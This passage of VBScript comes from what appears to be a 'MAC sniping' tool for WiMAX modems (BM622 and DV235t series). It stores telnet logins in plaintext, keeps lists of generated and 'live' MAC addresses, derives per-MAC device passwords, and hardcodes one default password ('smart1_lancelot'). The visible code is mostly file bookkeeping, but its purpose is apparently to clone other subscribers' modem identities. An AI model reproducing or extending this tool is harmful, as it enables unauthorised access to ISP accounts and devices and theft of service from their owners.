MsgBox "ERROR: You did not select your Network Adapter (LAN/WAN).!!(REQUIRED!!!)" & vbCr & vbLf & vbCr & vbLf & "CLICK Refresh button in Adapter(LAN) to show list of available LAN/WLAN." ,16+4096,"ERROR: SELECT your CORRECT LAN/WLAN....."
Exit Sub
End If
devConType = drpDwnOs.value ''InputStartIp.value
deviceName = getAdapterName''drpDwnNetAdapter.innerHTML 
devicePid = drpDwnNetAdapter.value 
MsgBox "Your CURRENT Network ADAPTER INFO (Please CHECK if correct...)." & vbCr & vbLf & vbCr & vbLf &"  LAN/WLAN DEVICE NAME: " & deviceName & vbCr & vbLf & "  LAN/WLAN DEVICE ID: " & devicePid & vbCr & vbLf& vbCr & vbLf & "  Operating System used: " & devConType,64+4096,"Information Message....."
filename = "MySystem.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
Set objOutputFile = fso.CreateTextFile(accountFile,True)
objOutputFile.Write devConType & "|" & deviceName & "|" & devicePid
objOutputFile.Close
MsgBox  "SUCCESS: My System Info save finished...",64+4096,"Status Message....."
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(accountFile, ForWriting)
objOutputFile.Write devConType & "|" & deviceName & "|" & devicePid
objOutputFile.Close
MsgBox  "SUCCESS: My System Info save finished...",64+4096,"Status Message....."
End If
''PopulateTelnetAccount	
PopulateMySystem
End Sub
''end of mySystemInfo
Sub CreateWimaxAccount
telnetUsername = inputTelnetUname.value
telnetPassword = inputTelnetPassowrd.value
telnetHost = inputTelnetHost.value
deviceModel = SelectDeviceOptionRadioBtnClick
''accountFile= "WimaxAccount.txt"
filename = "WimaxAccount.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
Set objOutputFile = fso.CreateTextFile(accountFile,True)
objOutputFile.Write telnetUsername & "|" & telnetPassword & "|" & telnetHost & "|" & deviceModel
objOutputFile.Close
MsgBox "Wimax telnet settings created...",48+4096,"Notification"
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(accountFile, ForWriting)
objOutputFile.Write telnetUsername & "|" & telnetPassword & "|" & telnetHost & "|" & deviceModel
objOutputFile.Close
MsgBox "Wimax telnet settings change...",48+4096,"Notification"
If radiobtnBm6222011.checked Then
MsgBox "NOTE: You MUST first ENABLE TELNET on BM622 2011!!!",48+4096,"ENABLED TELNET is REQUIRED"
End If
End If
PopulateTelnetAccount	
End Sub
Sub PopulateTelnetAccount
''accountFile= "WimaxAccount.txt"
filename = "WimaxAccount.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
sUsername = MyArray(0) 
sPassword = MyArray(1)
sHost = MyArray(2)
sDevice = MyArray(3)
inputTelnetUname.value = sUsername
inputTelnetPassowrd.value = sPassword
inputTelnetHost.value = sHost
If sDevice = "BM622i2010" Then
radiobtnBm622i.Checked = True
radiobtnBm622i.Click
ElseIf sDevice = "BM622" Then
radiobtnBm622.Checked = True
radiobtnBm622.Click
ElseIf sDevice = "BM6222011" Then
radiobtnBm6222011.Checked = True
radiobtnBm6222011.Click
ElseIf sDevice = "BM621" Then
radiobtnBm621.Checked = True
radiobtnBm621.Click
ElseIf sDevice = "BM622i2011" Then
radiobtnBm622i2011.Checked = True
radiobtnBm622i2011.Click
ElseIf sDevice = "BM622m2012" Then
radiobtnBm622m2012.Checked = True
radiobtnBm622m2012.Click
ElseIf sDevice = "DV235tG" Then
radiobtnDv235tG.Checked = True
radiobtnDv235tG.Click
ElseIf sDevice = "DV235tS" Then
radiobtnDv235tS.Checked = True
radiobtnDv235tS.Click
End If
Sleeper 1000
RunUpdateOnToolOk
Else
MsgBox "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!" ,16+4096,"IMPORTANT NOTICE!!!"
changeMACLog.value = "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!"
TextAreaScrollBottom(changeMACLog.name)
End If
End Sub
Function CheckTelnetAccountFile
result = false
''accountFile= "WimaxAccount.txt"
filename = "WimaxAccount.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
result = False
Else
result= True
End If
CheckTelnetAccountFile = result
End Function
Sub populateListOfGenMac 'populate listbox
'ClearListbox
Dim ForReading,strNewFile,objFSO,objTextFile
checkTimerWait
ForReading = 1

filename = "MacGenList.txt"
strNewFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
'strNewFile = "MacGenList.txt"
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strNewFile)=False Then
set objTextFile = objFSO.CreateTextFile(strNewFile)
objTextFile.Close
CreateTableandPopulateWithGenMacFile
Else
' Set objFile = objFSO.OpenTextFile(strNewFile)
CreateTableandPopulateWithGenMacFile
'Sleeper 100
'    Do Until objFile.AtEndOfStream
'        strLine = objFile.ReadLine
'        Set objOption = Document.createElement("OPTION")
'        objOption.Text = strLine
'        objOption.Value = strLine
'        listOfGenMac.Add(objOption)
'    Loop
'    objFile.Close
End if
Set objFSO = Nothing
Set ForReading = Nothing
Set strNewFile = Nothing
Set objTextFile = Nothing
'Set objFile = Nothing
End Sub 'end populate list box
Sub populateCurrentLiveIpScan 'populate listbox
'ClearListbox
Dim ForReading,strNewFile,objFSO,objTextFile
checkTimerWait
ForReading = 1
''strNewFile = "IpInfo.txt"
filename = "IpInfo.txt"
strNewFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strNewFile)=False Then
set objTextFile = objFSO.CreateTextFile(strNewFile)
objTextFile.Close
CreateTableandPopulateWithCurntIpScan
Else
' Set objFile = objFSO.OpenTextFile(strNewFile)
'CreateTableandPopulateWithGenMacFile
CreateTableandPopulateWithCurntIpScan
'Sleeper 100
'    Do Until objFile.AtEndOfStream
'        strLine = objFile.ReadLine
'        Set objOption = Document.createElement("OPTION")
'        objOption.Text = strLine
'        objOption.Value = strLine
'        listOfGenMac.Add(objOption)
'    Loop
'    objFile.Close
End if
Set objFSO = Nothing
Set ForReading = Nothing
Set strNewFile = Nothing
Set objTextFile = Nothing
'Set objFile = Nothing
End Sub 
Sub populateListOfLiveMac 'populate listbox
'ClearListbox
Dim ForReading,strNewFile2,objFSO,objTextFile2
checkTimerWait
ForReading = 1
'strNewFile = "MacGenList.txt"
filename = "LiveMac.txt"
strNewFile2 = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
''strNewFile2 = "LiveMac.txt"
Set objFSO = CreateObject("Scripting.FileSystemObject")
If  objFSO.FileExists(strNewFile2)=False Then
set objTextFile2 = objFSO.CreateTextFile(strNewFile2)
objTextFile2.Close
CreateTableandPopulateWithLiveFile
Else
' Set objFile = objFSO.OpenTextFile(strNewFile)
'Sleeper 100
CreateTableandPopulateWithLiveFile
'    Do Until objFile.AtEndOfStream
'        strLine = objFile.ReadLine
'        Set objOption = Document.createElement("OPTION")
'        objOption.Text = strLine
'        objOption.Value = strLine
'        listOfGenMac.Add(objOption)
'    Loop
'    objFile.Close
End if
Set objFSO = Nothing
Set ForReading = Nothing
Set strNewFile2 = Nothing
Set objTextFile2 = Nothing
'Set objFile = Nothing
End Sub 'end populate list box
Sub ClearListbox ' clear listbox
For Each objOption in listOfGenMac.Options
objOption.RemoveNode
Next 
End Sub   'end clear list box
''
' Set fso = CreateObject("Scripting.FileSystemObject")
'	  If Fso.FileExists("pressOk.vbs")=False Then
'	  Set objOutputFile = fso.CreateTextFile("pressOk.vbs", True)
'	  objOutputFile.WriteLine "WScript.Sleep WScript.Arguments(0)"
'	  objOutputFile.WriteLine "Set cloner = CreateObject("& "WScript.Shell" &")"
'	  objOutputFile.WriteLine ("cloner.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
'	  objOutputFile.Close
'	  Else
'	  	Const ForWriting = 2
'		Set objOutputFile = fso.OpenTextFile("pressOk.vbs", ForWriting)
'objOutputFile.WriteLine ("MsgBox" & chr(34) &"send keys activating"& chr(34)&"")
'	  	objOutputFile.WriteLine ("Set WshShell = CreateObject("& chr(34) &"WScript.Shell"& chr(34)&")")
'	  	objOutputFile.WriteLine "WScript.Sleep 5000"
'	  	objOutputFile.WriteLine ("WshShell.SendKeys("& chr(34) &"{Enter}"& chr(34)&")")
'objOutputFile.WriteLine ("MsgBox" & chr(34) &"Send KEys Finish"& chr(34)&"")
'		objOutputFile.Close
'	  End If
''
Sub ReadMacInTheFileAndTest
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set listMacFile = fso.OpenTextFile(textFilePath)
''loop get MAC line by line
Do while not listMacFile.AtEndOfStream 
'macToTest =  listMacFile.ReadLine()
macToTestLine =  listMacFile.ReadLine()
MyString = (Trim(macToTestLine))
MyArray = Split(MyString, "|", -1, 1)
macToTest = MyArray(0) 
'macToTestDomain = MyArray(1)
'fso.CreateTextFile(macToTest + ".txt")
DisplayLogMacGenScan("Testing: " & macToTest)
For loopLimitTimez = 0 To 3 Step 1
DisplayLogMacGenScan("Loop:  " & loopLimitTimez)
Sleeper 1000
Next
DisplayLogMacGenScan(macToTest & " test FINISHED...")
Loop
listMacFile.Close
End Sub
Sub StopMacProccessing
DisplayLogMacGenScan( "" & vbCr & vbLf& "PLEASE WAIT while trying to stop the process......" & vbCr & vbLf & "")
hdnStopMacProcess.value = "1" 
End Sub
Sub DisplayLogMacGenScan(stringMessage)
Sleeper 100
LogContents.Value = LogContents.Value & vbCr & vbLf & stringMessage 
TextAreaScrollBottom (LogContents.name)
End Sub 'end Readfile log file 
Sub DisplayLogChangeMAConly(stringMessage)
'	Sleeper 100
changeMACLog.Value = changeMACLog.Value & vbCr & vbLf & stringMessage 
TextAreaScrollBottom (changeMACLog.name)
End Sub 'end Readfile log file      
Sub TextAreaScrollBottom(htmlElementString)
Dim objTxtArea 
Set objTxtArea = window.document.getElementById(htmlElementString)
'Dim i
'For i = 0 To 200
'objTxtArea.Value = objTxtArea.Value & "Line #" & i & VbCrLf
objTxtArea.scrollTop = objTxtArea.scrollHeight + objTxtArea.scrollTop
'Next
'Set objTxtArea = Nothing
'Set i = Nothing
End Sub 'end TextAreaScroll
Sub CloseWindow
If hdnStopProcessResult.value = "1" Then
self.close
Else
StopMacProccessing
hdnStopProcessResult.value = "1"
MsgBox "Process is on going... Please WAIT and try again......"
End if
End Sub 'end close window
Sub CloseWindowSnipe
If hdnStopProcessResult.value = "1" Then
self.close
Else
StopMacProccessing
hdnStopProcessResult.value = "1"
MsgBox "Process is on going... Please WAIT and try again......"
End if
End Sub 'end close window
''testword WTIwNWFHSnRUbmxrV0c5NFRVUkJkdz09
Sub CountLine
Set fso = CreateObject("Scripting.FileSystemObject") 
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set theFile = fso.OpenTextFile(textFilePath, 8, True) 
'macLineNumber.value = theFile.Line -1 ' for textbox
macLineNumber.innerhtml = theFile.Line -1
theFile.Close
Set fso = Nothing
Set theFile = Nothing
End Sub
Function CountLineLiveMac
result = 0
Const ForReading = 8
Set fso = CreateObject("Scripting.FileSystemObject") 
filename = "LiveMac.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set theFile = fso.OpenTextFile(textFilePath, ForReading,True) 
'macLineNumber.value = theFile.Line -1 ' for textbox
'macLineNumber.innerhtml = theFile.Line -1
'MsgBox "Total live mac is " & theFile.Line -1
result = theFile.Line -1
theFile.Close
Set fso = Nothing
Set theFile = Nothing
macLineNumberLive.innerhtml = result
CountLineLiveMac = result
End Function
Sub ClearMacList
RestoreDefaultSettingsSnipe 
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objOutputFile = objFSO.OpenTextFile(textFilePath, ForWriting)
objOutputFile.Close
'DisplayLogMacGenScan
LogContents.Value = "Status idle..."
Sleeper 1200
populateListOfGenMac
'CreateTableandPopulateWithGenMacFile
End Sub 'end ClearMacList
''
Sub ClearMySystem
''RestoreDefaultSettingsSnipe 
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filename = "MySystem.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objOutputFile = objFSO.OpenTextFile(textFilePath, ForWriting)
objOutputFile.Close
'DisplayLogMacGenScan
''LogContents.Value = "Status idle..."
Sleeper 1200
''populateListOfGenMac
'CreateTableandPopulateWithGenMacFile
End Sub 'end ClearAdapterList
''
''
Sub ProtocolTesting
CreateObject("Wscript.Shell").Run(IsSnipeMacTest),0,False
Self.close
End Sub
''
Sub ClearLiveIpScanList
Dim objShellInGen, ansBtn
Set objShellInGen = CreateObject("WScript.Shell")
ansBtn = objShellInGen.Popup("Warning: ARE YOU SURE?" & vbCr & vbLf & " You CANNOT undo this process!" & vbCr & vbLf & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 16)
If (ansBtn = -1 OR ansBtn = 1)  Then
DisplayLogIpscan "Deleting ALL Scanned IP Live MAC list started..."
Else 
DisplayLogIpscan "Deleting ALL Scanned IP  Live MAC list canceled..."
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
'RestoreDefaultSettingsSnipe 
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filename = "IpInfo.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objOutputFile = objFSO.OpenTextFile(textFilePath, ForWriting)
objOutputFile.Close
'DisplayLogMacGenScan
'LogContents.Value = "Status idle..."
populateCurrentLiveIpScan 
'CreateTableandPopulateWithGenMacFile
End Sub 'end clearLiveIpscanList
Sub ClearLiveMacList
Dim objShellInGen, ansBtn
Set objShellInGen = CreateObject("WScript.Shell")
ansBtn = objShellInGen.Popup("Warning: ARE YOU SURE?" & vbCr & vbLf & " You CANNOT undo this process!" & vbCr & vbLf & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 16)
If (ansBtn = -1 OR ansBtn = 1)  Then
DisplayLogMacGenScan "Deleting ALL Sniped Live MAC list started..."
Else 
DisplayLogMacGenScan "Deleting ALL Sniped Live MAC list canceled..."
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
'RestoreDefaultSettingsSnipe 
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filename = "LiveMac.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objOutputFile = objFSO.OpenTextFile(textFilePath, ForWriting)
objOutputFile.Close
'DisplayLogMacGenScan
'LogContents.Value = "Status idle..."
populateListOfLiveMac
'CreateTableandPopulateWithGenMacFile
End Sub 'end ClearMacList
Sub ClearErrorLog
'RestoreDefaultSettingsSnipe 
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filename = "txtLogError.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
''currentFolderAndFile = Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34)
''MsgBox currentFolderAndFile
''If (objFSO.FileExists("txtLogError.txt")) Then 
If (objFSO.FileExists(currentFolderAndFile)) Then 
Set objOutputFile = objFSO.OpenTextFile(currentFolderAndFile, ForWriting)
objOutputFile.Close
Else 
MsgBox "Log is empty.."
End If
'DisplayLogMacGenScan
'LogContents.Value = "Status idle..."
'populateListOfGenMac
'CreateTableandPopulateWithGenMacFile
End Sub 
Sub RestoreDefaultSettingsSnipe
dropDownIncrement.selectedIndex = 0
snipeDomainDropdwnList.selectedIndex = 0
InputacAddress.value = macDefaultValue
InputacAddress.style.color = "#000000"
InputacAddress.style.background = "#FFFFFF"
dropDownLastHex.selectedIndex = 0
genMacButton.Disabled = True
addMacButton.Disabled = True
macRangeTOScan.value = ""
End Sub
Sub ClearTstCmndInOut
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
'	Set objFile = objFSO.OpenTextFile("MacGenList.txt", ForWriting)
'	objFile.WriteLine "Please Select"
'	objFile.Close
filenameIn = "TelnetInputCmnd.txt"
telnetInFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameIn)
filenameOut = "TelnetOutPutCmnd.txt"
telnetOutFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOut)
If (objFSO.FileExists(telnetInFile)) Then
Set objInputFile = objFSO.OpenTextFile(telnetInFile, ForWriting)
objInputFile.Close
End If
If (objFSO.FileExists(telnetOutFile)) Then
Set objOutputFile = objFSO.OpenTextFile(telnetOutFile, ForWriting)
objOutputFile.Close
End if
'DisplayLogMacGenScan
Set objFSO = Nothing
Set objInputFile = Nothing
Set objOutputFile = Nothing
LogContents.Value = "Status idle..."
populateListOfGenMac
End Sub 
'Sub appendFile(macAddressGen)
'	Dim textFilePath,objFSO,newbaseMac,objTextFile
'	const ForAppending = 8
'	textFilePath = "MacGenList.txt"
'	newbaseMac =  getBaseMac()
'	macStringToWrite = UCase(newbaseMac) & macAddressGen &"|"& snipeDomainDropdwnList.value
'	If MacIsInTheList(textFilePath,macStringToWrite) = False Then
'			set objFSO = createobject("Scripting.FileSystemObject")
'			If (objFSO.FileExists(textFilePath)) Then
'			set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
'			objTextFile.WriteLine(macStringToWrite)
'			objTextFile.Close
'			Else
'			  set objTextFile = objFSO.CreateTextFile(textFilePath)
'			objTextFile.WriteLine(macStringToWrite)
'			objTextFile.Close
'			End If
'	Else
'	DisplayLogMacGenScan "FAILED: " &UCase(newbaseMac) & macAddressGen & " is already in the Generated List....."
'	End If
'	Set textFilePath = Nothing
'	Set objFSO = Nothing
'	Set newbaseMac = Nothing
'	Set objTextFile = Nothing
'End Sub 'end appendFile
Function VersionAboutTool
VersionAboutTool = "V3.0"
End Function
Sub AddMactoGenList
''appendFile(InputacAddress.value)
macAnswer = Msgbox (" Type of MAC."  & vbCr & vbLf & vbCr & vbLf & "Question: MAC is for BM622m 2012-13 series??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If MAC is for BM622m 2012-13. "& vbCr & vbLf &  "Click [ NO ] If MAC is OLD MAC series or SMART MAC. ", vbYesNo, "Confirmation Message...")
macTestResult = "NA"
''MsgBox TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
If macAnswer = vbYes Then
''generat622mMAC
macTestResult = TestingMacOnlyGen("",Replace(InputacAddress.value,":",""))
ElseIf macAnswer = vbNo Then
''generat622mMAC
''macTestResult = Trim(generatePassword(InputacAddress.value))
	If radiobtnDv235tS.checked Then
		macTestResult = "smart1_lancelot"
	Else
		macTestResult = Trim(generatePassword(InputacAddress.value))
	End If
End If
''macTestResult = TestingMacOnlyGen("",Replace(InputacAddress.value,":",""))
	If macTestResult = "NA" Then
	DisplayLogMacGenScan("Password generation failed")
	Else
	appendFile InputacAddress.value,macTestResult
	End If
populateListOfGenMac
DisplayLogMacGenScan "Adding " &InputacAddress.value &" done."
End Sub
Sub appendFile(macAddressGen,genPass)
Dim textFilePath,objFSO,newbaseMac,objTextFile
const ForAppending = 8
''textFilePath = "MacGenList.txt"
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
deadMacFilename = "DoneSnipeMacList.txt"
textDeadMacFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &deadMacFilename)
newbaseMac =  getBaseMac()
''macStringToWrite = UCase(newbaseMac) & macAddressGen &"|"& snipeDomainDropdwnList.value
macStringToWrite = macAddressGen &"|"& snipeDomainDropdwnList.value &","& genPass
If MacIsInTheList(textFilePath,macStringToWrite) = False Then
If MacIsInTheList(textDeadMacFilePath,macStringToWrite) = False Then
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
objTextFile.WriteLine(macStringToWrite)
objTextFile.Close
Else
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine(macStringToWrite)
objTextFile.Close
End If
Else
DisplayLogMacGenScan "FAILED: " &macStringToWrite & " is already in the DoneSnipeMacList.txt....."
End If
Else
DisplayLogMacGenScan "FAILED: " &UCase(newbaseMac) & macAddressGen & " is already in the Generated List....."
End If
Set textFilePath = Nothing
Set objFSO = Nothing
Set newbaseMac = Nothing
Set objTextFile = Nothing
End Sub 'end appendFile TEST
''
Sub appendDeadMacToFile(deadMacAndDomain)
Dim textFilePath,objFSO,objTextFile
const ForAppending = 8
filename = "DoneSnipeMacList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
macStringToWrite = deadMacAndDomain
If MacIsInTheList(textFilePath,macStringToWrite) = False Then
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
objTextFile.WriteLine(macStringToWrite)
objTextFile.Close
Else
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine(macStringToWrite)
objTextFile.Close
End If
Else
DisplayLogMacGenScan "FAILED: " &deadMacAndDomain & " is already in the DoneSnipeMacList.txt....."
End If
Set textFilePath = Nothing
Set objFSO = Nothing
Set objTextFile = Nothing
End Sub 'end appendDeadMacToFile TEST
''
Sub CheckDeadMacListFile 'populate listbox
Dim ForReading,strNewFile,objFSO,objTextFile
checkTimerWait
ForReading = 1
filename = "DoneSnipeMacList.txt"
strNewFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strNewFile)=False Then
set objTextFile = objFSO.CreateTextFile(strNewFile)
objTextFile.Close
Else
''if file exist
End if
Set objFSO = Nothing
Set ForReading = Nothing
Set strNewFile = Nothing
Set objTextFile = Nothing
End Sub 'end CheckDeadMacListFile
''
Sub CheckMySystemFile 'populate listbox
Dim ForReading,strNewFile,objFSO,objTextFile
checkTimerWait
ForReading = 1
filename = "MySystem.txtt"
strNewFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strNewFile)=False Then
set objTextFile = objFSO.CreateTextFile(strNewFile)
objTextFile.Close
Else
''if file exist
End if
Set objFSO = Nothing
Set ForReading = Nothing
Set strNewFile = Nothing
Set objTextFile = Nothing
End Sub 'end CheckAdapterListFile
''
Sub appendMySystemToFile(dName,dPid)
Dim textFilePath,objFSO,objTextFile
const ForAppending = 8
filename = "MySystem.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
deviceAdapter = dName &"|"& dPid
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then
''MsgBox "Found"
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
objTextFile.WriteLine(deviceAdapter)
objTextFile.Close
Else
''MsgBox "No file found"
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine(deviceAdapter)
objTextFile.Close
End If

Set textFilePath = Nothing
Set objFSO = Nothing
Set objTextFile = Nothing
End Sub 'end apendAdapterList
''
Sub createTxtLogError(logtxt)
Dim textFilePath,objFSO,newbaseMac,objTextFile
const ForAppending = 8
''textFilePath = "txtLogError.txt"
filename = "txtLogError.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then
set objTextFile = objFSO.opentextfile(textFilePath,ForAppending)
objTextFile.WriteLine "============================ "& NOW & " ============================"
objTextFile.WriteLine(logtxt)
objTextFile.Close
Else
set objTextFile = objFSO.CreateTextFile(textFilePath)
objTextFile.WriteLine "============================ "& NOW & " ============================"
objTextFile.WriteLine(logtxt)
objTextFile.Close
End If
Set textFilePath = Nothing
Set objFSO = Nothing
Set newbaseMac = Nothing
Set objTextFile = Nothing
End Sub 'end createTxtLogError
Sub deleteMacFromGenFile(stringToFind)
Dim objFSO,objFile,strLine,strNewContents
Const ForReading = 1
Const ForWriting = 2
On Error Resume Next
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "MacGenList.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForReading)
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
If InStr(strLine, stringToFind) = 0 Then
strNewContents = strNewContents & strLine & vbCrLf
End If
Loop
objFile.Close
DisplayLogMacGenScan("Deleting MAC......")
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForWriting)
objFile.Write strNewContents
objFile.Close
Sleeper 100
populateListOfGenMac
'CreateTableandPopulateWithGenMacFile
If Err.Number = 0 Then
DisplayLogMacGenScan(stringToFind & " was successfully remove from the list...")
Else
DisplayLogMacGenScan("Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description)
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
Err.Clear
createTxtLogError LogContents.value 
End If
Set objFile = Nothing
Set objFSO = Nothing
Set strLine = Nothing
Set strNewContents = Nothing
End Sub
Function MacIsInTheList(txtFile,stringToFind)
Dim objFSO,objFile,strLine,countFoundString,foundString 
Const ForReading = 1
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(txtFile, ForReading)
countFoundString = 0
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
If InStr(strLine, stringToFind) <> 0 Then
countFoundString = countFoundString + 1
End If
Loop
objFile.Close
If countFoundString > 0 Then 
foundString  = True  
Else
foundString   = False 
End If
'MsgBox  foundString  & " count: " & countFoundString
MacIsInTheList = foundString
Set objFile = Nothing
Set objFSO = Nothing
Set strLine = Nothing
Set countFoundString = Nothing
Set foundString  = Nothing
End Function
Sub deleteMacFromLiveMacFile(stringToFind)
Dim objFSO,objFile,strLine,strNewContents
Const ForReading = 1
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "LiveMac.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForReading)
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
If InStr(strLine, stringToFind) = 0 Then
strNewContents = strNewContents & strLine & vbCrLf
End If
Loop
objFile.Close
DisplayLogMacGenScan("Deleting MAC......")
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForWriting)
objFile.Write strNewContents
objFile.Close
Sleeper 100
populateListOfLiveMac
liveMacEditDesc.value = ""
liveMacEdit.value = "Please select MAC"
liveMacEditFull.value = ""
liveMacEditHalfFull.value = ""
DisplayLogMacGenScan(stringToFind & " was successfully remove from the list...")
'CreateTableandPopulateWithGenMacFile
Set objFile = Nothing
Set objFSO = Nothing
Set strLine = Nothing
Set strNewContents = Nothing
End Sub
Sub deleteMacFromLiveIpScanFile(stringToFind)
Dim objFSO,objFile,strLine,strNewContents
Const ForReading = 1
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "IpInfo.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForReading)
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
If InStr(strLine, stringToFind) = 0 Then
strNewContents = strNewContents & strLine & vbCrLf
End If
Loop
objFile.Close
DisplayLogIpscan("Deleting MAC......")
Set objFile = objFSO.OpenTextFile(currentFolderAndFile, ForWriting)
objFile.Write strNewContents
objFile.Close
Sleeper 100
populateCurrentLiveIpScan 
liveIpScanEditDesc.value = ""
liveIpScanEdit.value = "Please select MAC"
liveIpScanEditFull.value = ""
liveIpScanEditHalfFull.value = ""
DisplayLogIpscan(stringToFind & " was successfully remove from the list...")
'CreateTableandPopulateWithGenMacFile
Set objFile = Nothing
